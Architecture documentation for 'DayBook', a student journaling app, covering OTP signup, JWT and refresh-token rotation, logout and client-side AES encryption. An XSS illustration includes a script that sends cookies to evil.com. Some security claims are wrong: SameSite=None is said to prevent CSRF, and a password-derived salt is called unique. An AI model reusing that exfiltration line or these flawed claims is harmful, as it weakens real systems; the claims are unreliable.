# DayBook Application - Complete Flow & Architecture Documentation


## 📋 Table of Contents
1. [Application Overview](#application-overview)
2. [User Registration & OTP Verification](#user-registration--otp-verification)
3. [Token Creation & Management](#token-creation--management)
4. [Login Process](#login-process)
5. [Protected API Calls & Auto-Refresh](#protected-api-calls--auto-refresh)
6. [Logout Process](#logout-process)
7. [Data Encryption](#data-encryption)
8. [Database Schema](#database-schema)
9. [Security Features](#security-features)
10. [Complete User Journey Diagrams](#complete-user-journey-diagrams)
11. [API Endpoints Reference](#api-endpoints-reference)

---

## Application Overview

**DayBook** is a secure, end-to-end encrypted journaling platform for LPU (Lovely Professional University) students. It provides:
- 🔐 Password-based AES-256 encryption for entries
- 📧 Email-based OTP verification for signup
- 🔄 Automatic token refresh with session management
- 📱 Secure multi-platform access
- 🎯 Smart search and organization features

### Technology Stack
- **Backend**: Node.js + Express.js
- **Database**: MongoDB + Redis + Mongoose ODM
- **Authentication**: JWT + Refresh Tokens
- **Encryption**: AES-256-CBC (client-side)
- **Frontend**: React + Redux Toolkit + RTK Query
- **Email Service**: Brevo SMTP

---

## User Registration & OTP Verification

### Phase 1: Signup Form Submission

**When:** User first visits DayBook and clicks "Sign Up"

**Endpoint**: `POST /api/auth/signup`

**Frontend Location**: `frontend/src/pages/Signup.jsx` → `handleSignup()`

**Backend Location**: `backend/src/controllers/authController.js` → `signup()`

#### Step 1: User Fills Form
User enters:
- **First Name** (50 char max)
- **Last Name** (50 char max)
- **Email** (100 char max, must end with `@lpu.in` - LPU-only community)
- **Password** (100 char max)

#### Step 2: Frontend Validation
```javascript
// Password Requirements:
✓ Minimum 8 characters
✓ At least 1 uppercase letter (A-Z)
✓ At least 1 lowercase letter (a-z)
✓ At least 1 number (0-9)
✓ At least 1 special symbol (!@#$%^&*)

// Email Requirements:
✓ Valid email format
✓ MUST end with @lpu.in (LPU domain only)
```

#### Step 3: Backend Processing

When user submits, the backend performs these checks:

1. **Email Validation**
   - Checks if email format is valid using validator library
   - Verifies email ends with `@lpu.in`

2. **User Status Check**
   ```
   Query Database:
   - IF verified user exists → Return error "User already exists!"
   - IF unverified user exists (old signup) → 
       * Refresh OTP (generate new one)
       * Update password & profile fields
       * Send new OTP email
   - IF new user → Create new user document
   ```

3. **OTP Generation**
   ```javascript
   // How OTP is Generated:
   const otp = crypto.randomInt(100000, 999999).toString()
   // Result: 6-digit random number (000000-999999)
   
   // Example: 427853, 912384, 561029, etc.
   ```

4. **OTP Hashing & Storage**
   ```javascript
   // IMPORTANT: OTP is NEVER stored in plaintext!
   
   const otpHash = await bcrypt.hash(otp, 10)
   // bcrypt with 10 rounds (very secure)
   // Hashed OTP is unrecoverable - only verification possible
   
   // Stored in Database:
   {
     otpHash: "$2b$10$...", // bcrypt hashed OTP
     otpExpiry: Date (now + 10 minutes),
     otpSentAt: Date (current timestamp),
     email: "user@lpu.in",
     password: "hashedPassword",
     isVerified: false
   }
   ```

5. **Email Sending**
   - Service Used: [Brevo SMTP](https://www.brevo.com/) (formerly Sendinblue)
   - SMTP Server: `smtp-relay.brevo.com` on port 2525
   - From Email: Verified sender email from env variables
   - Content: HTML formatted email with 6-digit OTP code
   - Delivery: Usually within 1-2 seconds

   **Email Template Example:**
   ```
   ┌─────────────────────────────────────┐
   │   Welcome to DayBook!               │
   │                                     │
   │   Your OTP Code:  4 2 7 8 5 3      │
   │                                     │
   │   This code expires in 10 minutes   │
   │   Do not share with anyone!         │
   └─────────────────────────────────────┘
   ```

6. **Response to Frontend**
   ```json
   {
     "message": "Account created! Please check your email for the verification code.",
     "email": "user@lpu.in"
   }
   ```

---

### Phase 2: OTP Verification

**When:** User receives OTP in email and enters it

**Endpoint**: `POST /api/auth/verify-otp`

**Frontend Location**: `frontend/src/pages/Signup.jsx` → `handleVerifyOtp()`

**Backend Location**: `backend/src/controllers/authController.js` → `verifyOtp()`

#### Request Format
```json
{
  "email": "user@lpu.in",
  "otp": "427853"  // The 6 digits user entered
}
```

### Backend Verification Process

```
Step 1: Find User
├─ Query: db.users.findOne({ email: "user@lpu.in" })
├─ If not found → Return error 404
└─ If found → Continue

Step 2: Check If Already Verified
├─ If user.isVerified === true
├─ Return error: "Email is already verified!"
└─ (Prevent re-verification attempts)

Step 3: Check OTP Expiry
├─ If new Date() > user.otpExpiry
├─ Return error 400: "OTP has expired! Request a new one."
└─ If still valid → Continue

Step 4: Verify OTP Against Hash
├─ Compare plaintext OTP with stored hash:
├─   bcrypt.compare(
│     "427853",  // User entered OTP
│     "$2b$10$..."  // Stored hash from DB
│   )
├─ If match === true → Continue to Step 5
└─ If match === false → Return error: "Invalid OTP!"

Step 5: Mark Email As Verified
├─ Set user.isVerified = true
├─ Clear OTP fields:
│  ├─ otpHash = null
│  ├─ otpExpiry = null
│  └─ otpSentAt = null
└─ Save to database

Step 6: Issue Tokens (see Token Creation section)
├─ Generate Access Token (15 min expiry)
├─ Generate Refresh Token (7 days expiry)
├─ Set in HTTP-only cookies
└─ Continue...
```

#### What Happens on Frontend After Successful Verification

1. **Encryption Key Derivation**
   ```javascript
   // Step 1: Derive encryption key from password
   const key = await deriveAndStoreKey(password)
   
   // Process:
   // password: "MyPassword123!" → PBKDF2-SHA256 → 256-bit key
   // 
   // Details:
   // - Algorithm: PBKDF2 with SHA-256 hash function
   // - Iterations: 100,000 (resistant to brute-force)
   // - Salt: SHA256(password) - unique per password
   // - Output: 256-bit (32 bytes) AES key
   
   // Example derivation (simplified):
   // Input:  "MyPassword123!"
   // Salt:   SHA256("MyPassword123!") = "a3f2d1..."
   // Output: "7f3e9a1b2c4d5e6f..." (32 bytes)
   ```

2. **Store Key in Session Storage**
   ```javascript
   // Store in sessionStorage (frontend only, not sent to server)
   sessionStorage._db_ekey = "7f3e9a1b2c4d5e6f..."
   
   // Lifetime: Until tab closes
   // Scope: Single tab only (not shared between tabs)
   // Security: 
   // - Not accessible to other tabs
   // - Automatically cleared when tab closes
   // - Cannot be stolen via cookies (no network transmission)
   ```

3. **Update Redux State**
   ```javascript
   // User info
   dispatch(userInfo({
     _id: "userId123",
     email: "user@lpu.in",
     firstName: "John",
     lastName: "Doe"
   }))
   
   // Encryption key
   dispatch(setEncKey("7f3e9a1b2c4d5e6f..."))
   ```

4. **Redirect to Application**
   ```javascript
   // User is now fully authenticated and ready to use app
   navigate("/dashboard") // or home page
   ```

#### Success Response
```json
{
  "message": "Email verified successfully! Welcome to DayBook.",
  "data": {
    "_id": "507f1f77bcf86cd799439011",
    "email": "user@lpu.in",
    "firstName": "John",
    "lastName": "Doe",
    "profilePhoto": null
  }
}
```

---

### Phase 3: Resend OTP

**When:** User doesn't receive OTP or requests a new code

**Endpoint**: `POST /api/auth/resend-otp`

**Rate Limit**: 3 requests per 5 minutes per IP address

#### Process
```
Step 1: Check Rate Limit
├─ Check if last OTP sent < 60 seconds ago
├─ If yes → Return error with countdown (e.g., "Wait 45 more seconds")
└─ If no → Continue

Step 2: Generate New OTP
├─ Generate new 6-digit random number
├─ Hash with bcrypt
└─ Update otpExpiry to 10 minutes from now

Step 3: Send Email
├─ Send new OTP via Brevo SMTP
└─ Update otpSentAt timestamp

Step 4: Response
└─ Return success message
```

#### Rate Limiting Logic
- **First Request**: Can request immediately
- **Second Request**: Must wait 60 seconds
- **Third Request**: Must wait another 60 seconds
- **Requests Beyond 3 in 5 min**: Blocked for 5 minutes

This prevents spam while allowing legitimate resends.

---

## Token Creation & Management

### How Tokens are Created

**Triggered After:**
- ✅ Email verification (OTP verify endpoint)
- ✅ Successful login
- ✅ Token refresh request

**Function Location**: `backend/src/utils/generateToken.js`

### Access Token (Short-lived)

**Purpose**: Used to authenticate regular API requests

```javascript
// Creation
const accessToken = jwt.sign(
  { _id: user._id },  // Payload: only user ID
  process.env.JWT_SECRET,  // Secret key from env
  { expiresIn: "15m" }  // Expires in 15 minutes
)

// Format: JWT (3 parts separated by dots)
// header.payload.signature
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
// eyJfaWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJpYXQiOjE2OTQwODU0MDcsImV4cCI6MTY5NDA4NjMwN30.
// 7f3e9a1b2c4d5e6f...

// Payload (decoded):
{
  "_id": "507f1f77bcf86cd799439011",
  "iat": 1694085407,  // Issued at timestamp
  "exp": 1694086307   // Expiration timestamp (15 min later)
}
```

**Storage**:
```javascript
res.cookie("token", accessToken, {
  httpOnly: true,      // Not accessible to JavaScript (XSS protection)
  secure: true,        // HTTPS only (no HTTP)
  sameSite: "None",    // Cross-origin requests allowed
  expires: new Date(Date.now() + 15 * 60 * 1000)  // 15 minutes
})
```

**Usage**:
- Browser automatically sends in `Cookie: token=...` header
- Backend's `authMiddleware` validates signature and expiry
- If valid, user is authenticated for that request
- If expired, frontend triggers refresh

---

### Refresh Token (Long-lived, Opaque)

**Purpose**: 
- Used to obtain new access tokens
- Survives longer than access token (7 days)
- Never decoded on frontend (opaque/unreadable)

```javascript
// Generation: Random 40-byte string
const refreshToken = crypto.randomBytes(40).toString("hex")

// Example:
// "7f3e9a1b2c4d5e6f8a9b0c1d2e3f4a5b6c7d8e9f"
// (40 bytes = 80 hex characters)

// Key feature: Cannot be decoded
// - Unlike JWT, it's just a random token
// - No embedded information
// - Server lookup required to validate
```

**Storage in Database**:
```javascript
// The refresh token is HASHED before storing!
const tokenHash = crypto.createHash("sha256")
  .update(refreshToken)
  .digest("hex")

// Stored record:
{
  userId: ObjectId("507f1f77bcf86cd799439011"),
  tokenHash: "8f7e9a1b2c4d5e6f...",  // SHA-256 hash only
  expiresAt: Date(now + 7 days),      // Expires in 7 days
  createdAt: Date(now)                // Auto-set by MongoDB
}

// Database has TTL Index:
// - Automatically deletes expired tokens after 7 days
// - No manual cleanup needed
```

**Storage in Browser Cookie**:
```javascript
res.cookie("refreshToken", refreshToken, {
  httpOnly: true,      // Not accessible to JS
  secure: true,        // HTTPS only
  sameSite: "None",    // Cross-origin
  path: "/api/auth",   // Only sent to refresh endpoint (optimization)
  expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 days
})
```

**Why Hash the Refresh Token?**
```
Security Protection:

Without hashing (DANGEROUS):
- If DB is breached → Attacker gets actual refresh tokens
- Can use them to get new access tokens
- Full account compromise

With hashing (SAFE):
- If DB is breached → Attacker gets only hashes
- Cannot reverse hash to get actual token
- Tokens in browser cookies are only copy
- Attacker needs both DB AND to steal cookies

This is "defense in depth"

```

---

### Token Pair Response

**When Tokens are Issued** (After signup verification or login):

```json
// Server sends both tokens via Set-Cookie headers
Set-Cookie: token=eyJhbGc...; HttpOnly; Secure; SameSite=None
Set-Cookie: refreshToken=7f3e9a...; HttpOnly; Secure; Path=/api/auth; SameSite=None

// Frontend receives user data
{
  "message": "Email verified successfully!",
  "data": {
    "_id": "507f1f77bcf86cd799439011",
    "email": "user@lpu.in",
    "firstName": "John",
    "lastName": "Doe"
  }
}

// Cookies are automatically stored by browser
// No JavaScript involved (httpOnly)
```

---

### Session Management Policy

**One Device Per User**:
```javascript
// When new login happens:
await RefreshToken.deleteMany({ userId: user._id })

// Effect:
// - All existing refresh tokens for user are deleted
// - User's previous device/browser session becomes invalid
// - Only newest login remains active
// - Previous device gets logged out automatically

// Why this design?
// - Prevents token sharing between devices
// - If refresh token is stolen on old device, new login invalidates it
// - User always knows who's logged in (only one device at a time)
```

---

## Login Process

**Endpoint**: `POST /api/auth/login`

**Frontend Location**: `frontend/src/pages/Login.jsx`

**Backend Location**: `backend/src/controllers/authController.js` → `login()`

**Rate Limit**: 5 attempts per 15 minutes per IP (brute-force protection)

### Request Format
```json
{
  "email": "user@lpu.in",
  "password": "MyPassword123!"
}
```

### Backend Verification Steps

```
Step 1: Find User by Email
├─ Query: db.users.findOne({ email: "user@lpu.in" })
├─ Search is case-insensitive (handles both cases)
├─ If not found → Return error 401: "Invalid credentials!"
│  (Generic message - doesn't reveal if email exists)
└─ If found → Continue

Step 2: Check Email Verification Status
├─ If user.isVerified === false
├─ Return error 403 with flag: { requiresVerification: true }
├─ Include email so user can request OTP again
│  (User must verify email before login)
└─ If verified → Continue

Step 3: Password Verification
├─ Compare plaintext password with bcrypt hash:
│  bcrypt.compare(
│    "MyPassword123!",  // User entered
│    "$2b$10$..." // Stored hash
│  )
├─ If false → Return error 401: "Invalid credentials!"
├─ (Again, generic - doesn't say password vs email wrong)
└─ If true → Continue

Step 4: Issue Access & Refresh Tokens
├─ Generate new access token (15 min)
├─ Generate new refresh token (7 days)
├─ Delete all old refresh tokens (single device policy)
├─ Set new tokens in cookies
└─ Continue to Step 5

Step 5: Return Response
└─ Send user data + tokens in cookies
```

### Frontend After Successful Login

```javascript
// Step 1: Derive encryption key
const key = await deriveAndStoreKey(password)
// Uses same PBKDF2-SHA256 process as signup
// Same password → Same key (entries become readable!)

// Step 2: Store key in sessionStorage
sessionStorage._db_ekey = key

// Step 3: Update Redux
dispatch(userInfo({ email, firstName, ... }))
dispatch(setEncKey(key))

// Step 4: Redirect
navigate("/dashboard")

// Result: User can now view and decrypt entries
```

### Success Response
```json
{
  "message": "User logged in successfully!",
  "data": {
    "_id": "507f1f77bcf86cd799439011",
    "email": "user@lpu.in",
    "firstName": "John",
    "lastName": "Doe",
    "profilePhoto": null
  }
}
```

---

## Protected API Calls & Auto-Refresh

### Normal Protected API Call (Access Token Valid)

**Scenario**: User makes request within 15 minutes of login/refresh

```
Browser Request:
├─ GET /api/entries
├─ Cookie: token=eyJhbGc...; refreshToken=7f3e9a...
└─ (Browser sends automatically)

Backend authMiddleware:
├─ Extract token from cookie
├─ jwt.verify(token, JWT_SECRET)
├─ Signature matches? ✓
├─ Not expired? ✓
├─ Decode to get userId
├─ Query user from DB
├─ Attach req.user = { full user document }
└─ Call next() → Handler processes request

Handler executes:
├─ Uses req.user._id
├─ Queries user's entries
└─ Returns encrypted entries

Response:
├─ 200 OK
├─ Array of encrypted entries
└─ User decrypts on frontend with session key
```

---

### Protected API Call (Access Token Expired - Silent Refresh)

**Scenario**: Access token expired, but refresh token still valid

```
Browser Request:
├─ GET /api/entries (with expired token)
└─ (User has been idle > 15 minutes)

Backend authMiddleware:
├─ jwt.verify() throws TokenExpiredError
├─ Catch error, check error.name
├─ If "TokenExpiredError" → Return 401:
│  {
│    "tokenExpired": true,  ← IMPORTANT FLAG
│    "message": "Access token expired"
│  }
└─ (Not just status 401, but specific flag)

Frontend Intercept (RTK Query - apiSlice.js):
├─ Check if response.status === 401
├─ AND response.data.tokenExpired === true
├─ If both true → Trigger refresh
├─ (Other 401 errors don't trigger refresh)
└─ Continue...

Frontend Mutex Lock (Prevent Thundering Herd):
├─ Global variable: let refreshPromise = null
├─ If refreshPromise already exists:
│  └─ Multiple pending requests AWAIT existing refresh
│     (Don't start multiple refresh calls simultaneously)
├─ If no existing refresh:
│  ├─ Create promise for new refresh call
│  ├─ Set refreshPromise = fetch("/auth/refresh")
│  └─ All pending requests wait for this one
└─ Continue...

Refresh Request:
├─ POST /api/auth/refresh
├─ Body: {} (empty)
├─ Cookies: { refreshToken=7f3e9a... }
├─ (Browser sends refreshToken automatically)
└─ No authentication middleware needed

Backend Refresh Handler:
├─ Step 1: Extract refreshToken from cookie
├─ Step 2: Hash it: tokenHash = SHA256(refreshToken)
├─ Step 3: Query RefreshToken collection:
│  db.refreshTokens.findOne({ tokenHash })
├─ Step 4: Validate:
│  ├─ Record exists? 
│  ├─ expiresAt > now?
│  ├─ Both true → Continue
│  └─ If false → Return 401 (refresh failed)
├─ Step 5: Token Rotation (IMPORTANT):
│  ├─ Delete old refresh token from DB
│  │  (This token can only be used ONCE)
│  ├─ Rationale: If compromised, one-time use
│  ├─ Generate NEW refresh token
│  └─ Store new token hash in DB
├─ Step 6: Issue New Tokens:
│  ├─ Generate NEW access token (15 min)
│  ├─ Generate NEW refresh token (7 days)
│  ├─ Set both in cookies (replacing old ones)
│  └─ Return success
└─ Continue...

Frontend After Refresh Success:
├─ refreshPromise resolves
├─ Pending requests resume
├─ All use new access token automatically
├─ (Browser resends with new token in cookie)
│  GET /api/entries (with NEW token)
├─ This time: authMiddleware validates ✓
└─ Request succeeds normally

User Experience:
└─ No page refresh
    No login screen
    No interruption
    Completely silent!
```

### Refresh Fails (Refresh Token Expired/Invalid)

```
Backend Refresh Handler:
├─ Cannot find token record in DB
├─ OR token has expired
├─ Return: 401 Unauthorized

Frontend Detects Refresh Failure:
├─ Dispatch removeUserInfo():
│  ├─ Clear Redux state (user = null)
│  ├─ Clear any cached data
│  └─ Redux state back to initial
├─ Call clearKeyFromSession():
│  ├─ Delete sessionStorage._db_ekey
│  ├─ Encryption key lost (tab-scoped)
│  └─ Cannot decrypt entries anymore
├─ Redirect to /login:
│  └─ User sees login form
├─ Query parameter: redirect=<original_path>
│  └─ After login, return to where they were
└─ All pending requests fail

User Experience:
└─ Session ended
    Must log in again
    Typical after 7 days idle
    (Refresh token expires after 7 days)
```

### Rate Limiting on Refresh

```javascript
// Rate Limit: 20 attempts per 5 minutes per IP
// (More generous than other endpoints)

// Why more generous?
// - Auto-refresh happens frequently (every 15 min access token expires)
// - Can happen multiple times per user session
// - Not a security risk (only works with valid refresh token)
// - Legitimate users need this

// Attack scenario: Someone with stolen refresh token
// - 20 refreshes = 20 * 15 min = 300 minutes (5 hours of activity)
// - Stolen token expires after 7 days anyway
// - Still better to catch abuse early
```

---

## Logout Process

**Endpoint**: `POST /api/auth/logout`

**Requires**: Authentication middleware (user must be logged in)

**Frontend Location**: `frontend/src/components/auth/Logout.jsx` or `userSlice.js`

### Backend Process

```
Step 1: Get Current Refresh Token
├─ Extract refreshToken from request cookies
├─ Hash it: tokenHash = SHA256(refreshToken)
└─ Continue...

Step 2: Delete Current Token
├─ Query: db.refreshTokens.findOne({ tokenHash })
├─ Delete this specific record
└─ Continue...

Step 3: Delete All User's Tokens (Belt & Suspenders)
├─ Additional safety: Delete ALL tokens for this user
│  db.refreshTokens.deleteMany({ userId: user._id })
├─ Reason: Ensure all devices logged out
└─ Continue...

Step 4: Clear Cookies
├─ Set-Cookie: token=""; expires=Date(0)
│  (Immediate expiry = delete)
├─ Set-Cookie: refreshToken=""; expires=Date(0); path=/api/auth
│  (Also immediate expiry)
└─ Browser deletes these cookies

Step 5: Response
└─ Return 200 OK success message
```

### Frontend Process

```javascript
// Step 1: Make logout API call
const response = await fetch("/api/auth/logout", {
  method: "POST",
  credentials: "include"  // Send cookies
})

// Step 2: Clear Redux State
dispatch(removeUserInfo())
// Result: user = null in Redux store

// Step 3: Clear Encryption Key
clearKeyFromSession()
// Removes sessionStorage._db_ekey
// User cannot decrypt entries anymore

// Step 4: Redirect to Login
navigate("/login", { replace: true })

// Result: User is now logged out
```

### Security of Logout

```
Scenario: Attacker somehow keeps old refresh token

Step 1: Try to use old refresh token
├─ POST /api/auth/refresh
├─ Cookie: refreshToken=<old_stolen_token>
└─ Continue...

Step 2: Backend validation
├─ Hash the token
├─ Query database: db.refreshTokens.findOne({ tokenHash })
├─ Result: Record not found!
│  (It was deleted during logout)
├─ Return 401 Unauthorized
└─ Result: Attack fails

Why it fails:
├─ The token was deleted from DB (Step 3 in backend logout)
├─ Even if attacker has the cookie, server has no match
├─ Cannot issue new access token without valid DB record
└─ Attack blocked!

Additional safety:
└─ New login on another device deletes all tokens
    (One device per user policy)
```

---

## Data Encryption

### Why Client-Side Encryption?

```
Server-Side Encryption (BAD):
├─ Server has plaintext data
├─ If server is breached → All data exposed
├─ Server operators can read user data
├─ Trust required in hosting provider
└─ Not true privacy

Client-Side Encryption (GOOD):
├─ Server NEVER sees plaintext
├─ Only encrypted data goes to server
├─ If server breached → Only ciphertext (unusable)
├─ User has complete control of keys
├─ True end-to-end encryption
└─ User is sole key holder
```

### Encryption Architecture

**Key Derivation Process** (When user logs in):

```javascript
// Input: password = "MyPassword123!"

// Step 1: Hash the password
const salt = crypto.subtle.digest(
  "SHA-256",
  new TextEncoder().encode("MyPassword123!")
)
// Result: 32 bytes of data (deterministic - same password → same salt)

// Step 2: Derive key using PBKDF2
const encryptionKey = crypto.subtle.deriveKey(
  {
    name: "PBKDF2",
    salt: salt,
    hash: "SHA-256",
    iterations: 100000  // Very resistant to brute-force
  },
  await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode("MyPassword123!"),
    { name: "PBKDF2" },
    false,
    ["deriveKey"]
  ),
  { name: "AES-CBC", length: 256 },  // 256-bit AES
  true,  // Extractable (needed for storage)
  ["encrypt", "decrypt"]
)

// Step 3: Export key as raw bytes
const keyBytes = await crypto.subtle.exportKey("raw", encryptionKey)
const keyHex = Array.from(new Uint8Array(keyBytes))
  .map(b => b.toString(16).padStart(2, "0"))
  .join("")
// Result: "7f3e9a1b2c4d5e6f..." (64 hex chars = 32 bytes)

// Step 4: Store in sessionStorage
sessionStorage._db_ekey = keyHex

// Key Properties:
// ✓ Deterministic: Same password → same key
// ✓ Unique per password: Different password → completely different key
// ✓ 100k iterations: Takes ~100ms to derive (slow for brute-force)
// ✓ Session-scoped: Lost when tab closes
// ✓ Derived from password: No separate storage needed
```

### Entry Encryption

**When User Saves an Entry**:

```javascript
// Input: plaintext = "Dear Diary, I had a great day today!"

// Step 1: Generate Random IV (Initialization Vector)
const iv = crypto.getRandomValues(new Uint8Array(16))
// Result: 16 random bytes
// Why random? Different entries never encrypt the same way
// Even identical plaintext → Different ciphertext each time!

// Step 2: Encrypt using AES-256-CBC
const ciphertext = crypto.subtle.encrypt(
  { name: "AES-CBC", iv: iv },
  encryptionKey,  // From sessionStorage._db_ekey
  new TextEncoder().encode(plaintext)
)
// Result: Encrypted bytes

// Step 3: Encode to Base64
const ivBase64 = btoa(String.fromCharCode(...new Uint8Array(iv)))
const ciphertextBase64 = btoa(String.fromCharCode(...new Uint8Array(ciphertext)))

// Step 4: Format for Storage
const encryptedEntry = `${ivBase64}:${ciphertextBase64}`
// Example:
// "aBcDefGhiJKlmNoPQ==:xY9Z0aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2y3z4"

// Step 5: Send to Server
POST /api/entries {
  "title": "Day 1",
  "content": "aBcDefGhiJKlmNoPQ==:xY9Z0aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2y3z4"
}
```

### Entry Decryption

**When User Reads an Entry**:

```javascript
// Input: encrypted = "aBcDefGhiJKlmNoPQ==:xY9Z0aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2y3z4"

// Step 1: Split IV and Ciphertext
const [ivBase64, ciphertextBase64] = encrypted.split(":")

// Step 2: Decode from Base64
const iv = new Uint8Array(
  atob(ivBase64)
    .split("")
    .map(c => c.charCodeAt(0))
)
const ciphertext = new Uint8Array(
  atob(ciphertextBase64)
    .split("")
    .map(c => c.charCodeAt(0))
)

// Step 3: Decrypt using AES-256-CBC
const plaintext = await crypto.subtle.decrypt(
  { name: "AES-CBC", iv: iv },
  encryptionKey,  // MUST be same key as encryption!
  ciphertext
)

// Step 4: Convert to String
const decryptedText = new TextDecoder().decode(plaintext)
// Result: "Dear Diary, I had a great day today!"

// Why must the same password used to encrypt?
// - Different password → Different key
// - Different key → Decryption fails (garbled output)
// - This is by design (password-based encryption)
```

### Key Rotation on Password Change

**When User Changes Password**:

```javascript
// Old password: "OldPassword123!"
// New password: "NewPassword456!"

// Backend (Protected by authMiddleware):
├─ Verify old password is correct
├─ Update password hash in DB
├─ Delete all refresh tokens (logout all devices)
└─ Return success

// Frontend:
├─ Derive NEW key from new password
├─ Store new key in sessionStorage
├─ Clear old key from memory
└─ Redirect to login/dashboard

// Important consequences:
├─ Old entries encrypted with old key → Now unreadable!
├─ Why? New key ≠ old key (different password)
├─ Solution: User must keep same password or lose encrypted data
├─ Future entries: Use new key
└─ This is expected behavior (password-based encryption)

// This is NOT a bug - it's cryptographic reality:
// - You cannot encrypt with key A and decrypt with key B
// - Once password changed, only new entries are encrypted with new key
// - Old entries remain encrypted but unusable (encrypted with old password)
```

---

## Database Schema

### Users Collection

```javascript
{
  _id: ObjectId,                    // MongoDB ID
  
  // Authentication
  email: String,                    // Unique, required, @lpu.in only
  password: String,                 // bcrypt hash (salted, 10 rounds)
  isVerified: Boolean,              // Default: false, true after OTP verify
  
  // OTP Fields (cleared after verification)
  otpHash: String,                  // bcrypt hash of 6-digit OTP
  otpExpiry: Date,                  // Expires in 10 minutes
  otpSentAt: Date,                  // For rate limit checking (60sec resend)
  
  // Profile Information
  firstName: String,                // Required
  lastName: String,                 // Optional
  profilePhoto: String,             // Cloudinary URL or null
  profilePhotoPublicId: String,     // For deletion
  
  // Metadata
  createdAt: Date,                  // Auto-set on creation
  updatedAt: Date                   // Auto-updated on modification
}

// Indexes:
// - email: UNIQUE (prevent duplicate emails)
```

### Refresh Tokens Collection

```javascript
{
  _id: ObjectId,
  
  userId: ObjectId,                 // Reference to users collection
  tokenHash: String,                // SHA-256 hash of refresh token
  expiresAt: Date,                  // When token expires (7 days)
  createdAt: Date,                  // Auto-set on creation
}

// Indexes:
// - userId: Regular (for querying by user)
// - tokenHash: UNIQUE (for finding token by hash)
// - expiresAt: TTL (auto-delete when expired)
//   └─ MongoDB automatically deletes documents when expiresAt passes
//   └─ Happens in background every 60 seconds
```

### Entries Collection (Example)

```javascript
{
  _id: ObjectId,
  
  userId: ObjectId,                 // Reference to owner
  title: String,                    // User-defined title
  content: String,                  // ENCRYPTED format:
                                    // "ivBase64:ciphertextBase64"
  encryptedContent: String,         // Alternative field name
  
  createdAt: Date,
  updatedAt: Date
}

// Indexes:
// - userId: For querying user's entries
```

---

## Security Features

### 1. Rate Limiting

**Purpose**: Prevent brute-force attacks, DDoS, API abuse

**Endpoints Protected**:

| Endpoint | Limit | Window |
|----------|-------|--------|
| POST /api/auth/signup | 10/hour | per IP |
| POST /api/auth/verify-otp | 5 | per 10 min |
| POST /api/auth/resend-otp | 3 | per 5 min |
| POST /api/auth/login | 5 | per 15 min |
| POST /api/auth/refresh | 20 | per 5 min |
| GET /api/posts/search | 30 | per 1 min |

### 2. Password Security

**Requirements** (Enforced on Frontend):
- ✓ Minimum 8 characters
- ✓ At least 1 uppercase (A-Z)
- ✓ At least 1 lowercase (a-z)
- ✓ At least 1 number (0-9)
- ✓ At least 1 special symbol (!@#$%^&*)

**Storage** (Backend):
- ✓ bcrypt hashing (10 rounds)
- ✓ Never stored plaintext
- ✓ Each password has unique salt (built into bcrypt)

**Verification**:
```javascript
// Never compare plaintext strings!
// WRONG: if (password === user.password)  ❌

// RIGHT: Use bcrypt
if (await bcrypt.compare(password, user.password)) {  ✓
  // Passwords match
}
```

### 3. OTP Security

**Generation**:
- ✓ 6 random digits (100,000 combinations)
- ✓ Never stored plaintext (bcrypt hashed)
- ✓ Expires in 10 minutes
- ✓ Cannot view previous OTP (can only verify)

**Delivery**:
- ✓ Via Brevo SMTP (trusted provider)
- ✓ User's email only (verified by ownership)
- ✓ No OTP shown in logs or frontend console

### 4. Token Security

**Access Tokens**:
- ✓ JWT with symmetric signature (HMAC-SHA256)
- ✓ 15-minute expiry (short-lived, limited damage if leaked)
- ✓ Signed with server secret (signature prevents tampering)
- ✓ Stored in httpOnly cookie (XSS resistant)

**Refresh Tokens**:
- ✓ Opaque 40-byte random string (undecodable)
- ✓ Only hash stored in DB (raw token never persisted)
- ✓ 7-day expiry (longer for UX, acceptable security)
- ✓ One-time use (deleted after refresh - rotation)
- ✓ Stored in httpOnly cookie with path=/api/auth

**Why Token Rotation?**
```
Scenario: Refresh token stolen

Without rotation:
├─ Attacker uses same token repeatedly
├─ Attacker's activity blends with user's
├─ Hard to detect compromise
└─ Long-lasting attack window

With rotation (our implementation):
├─ Each refresh issues NEW refresh token
├─ Old token deleted from DB (cannot be reused)
├─ Attacker's token becomes useless after refresh
├─ User's next refresh gets different token
├─ Easy to detect: Attacker's old token fails
└─ Attack window limited to 1 successful use
```

### 5. Cookie Security

**Flags Used** (Both tokens):
```javascript
{
  httpOnly: true,      // Prevents JavaScript access
                       // Protects against XSS cookie theft
                       // Example: evil.js cannot read cookies

  secure: true,        // HTTPS only (no HTTP)
                       // Prevents man-in-the-middle interception
                       // Example: Can't sniff cookies over open WiFi

  sameSite: "None",    // Cross-origin requests allowed
                       // With secure:true, acceptable
                       // Prevents CSRF attacks

  path: "/api/auth"    // Only sent to /api/auth/* endpoints
                       // (refreshToken only - optimization)
}
```

**Why httpOnly?**
```
XSS Attack Example:

Without httpOnly (vulnerable):
┌─ Attacker injects script: <script>
│  fetch("https://evil.com?cookie=" + document.cookie)
│</script>
├─ JavaScript runs on user's browser
├─ Steals cookies: "token=eyJhbGc..."
├─ Sends to attacker's server
└─ Attacker can impersonate user
   └─ Full account compromise

With httpOnly (protected):
┌─ Same XSS script injected
├─ eval() still runs
├─ But document.cookie is EMPTY
├─ HTTPOnly cookies not accessible to JavaScript
├─ document.cookie shows nothing
└─ XSS prevented (attacker can't steal cookies)
   └─ Account remains secure!
```

### 6. Email Security

**Domain Restriction**: Only `@lpu.in` emails allowed
- ✓ Creates LPU-only community
- ✓ Prevents spam account creation
- ✓ All users are verified students

### 7. Session Management

**One Device Per User**:
```javascript
// New login scenario
├─ User logs in on Phone
├─ Backend deletes all old refresh tokens
├─ User's Desktop session becomes invalid
├─ Desktop user: "Your session ended"
├─ Desktop tries to use old refresh token
├─ Token lookup fails in DB (deleted)
└─ Desktop redirected to login

// Why this design?
├─ Prevents token sharing between people
├─ One login = one active session
├─ If account compromised, old sessions invalidated
└─ Simplified session management
```

### 8. Encryption Security

**Password-Based Key Derivation**:
```javascript
// PBKDF2-SHA256 with 100,000 iterations

// What this protects against:
// ✓ Dictionary attacks
//   - Takes 100ms per try (not instant)
